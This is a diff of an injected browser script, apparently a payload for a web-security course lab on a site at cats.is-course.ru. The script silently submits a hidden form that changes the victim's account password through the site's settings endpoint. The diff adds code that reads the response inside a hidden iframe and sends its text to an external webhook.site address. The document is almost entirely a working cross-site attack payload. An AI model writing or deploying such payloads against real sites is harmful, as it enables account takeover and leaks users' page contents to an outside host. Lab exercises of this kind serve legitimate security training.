@@ -1,5 +1,5 @@
 <script>
-    console.log('v8')
+console.log('v9');
 
 if(document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
@@ -9,30 +9,46 @@ if(document.readyState === 'loading') {
 
 function init() {
     var iframe = document.createElement('iframe');
-    iframe.name = 'hiddenFrame';
+    iframe.name = 'responseFrame';
     iframe.style.display = 'none';
+    
+    iframe.onload = function() {
+        try {
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            var responseHTML = iframeDoc.documentElement.outerHTML;
+            var responseText = iframeDoc.body.innerText;
+
+            var img = new Image();
+            img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?response_length=" + responseHTML.length + 
+                     "&text_sample=" + encodeURIComponent(responseText.substring(0, 200)) +
+                     "&success=" + (responseText.includes('успех') || responseText.includes('success') || responseText.includes('изменен'));
+                     
+        } catch(e) {
+            var img = new Image();
+            img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error";
+        }
+    };
+    
     document.body.appendChild(iframe);
     
     var form = document.createElement('form');
     form.method = 'POST';
     form.action = 'https://cats.is-course.ru/settings';
-    form.target = 'hiddenFrame';
+    form.target = 'responseFrame';
     form.style.display = 'none';
 
     var pass1 = document.createElement('input');
     pass1.name = 'password';
-    pass1.value = 'Abcdef_12345678';
+    pass1.value = 'Abcdef_1234567';
 
     var pass2 = document.createElement('input');
     pass2.name = 'confirm-password';
-    pass2.value = 'Abcdef_12345678';
+    pass2.value = 'Abcdef_1234567';
 
     form.appendChild(pass1);
     form.appendChild(pass2);
     document.body.appendChild(form);
 
     form.submit();
-    var img = new Image();
-    img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?form_submitted_successfully&time=" + Date.now();
 }
 </script>
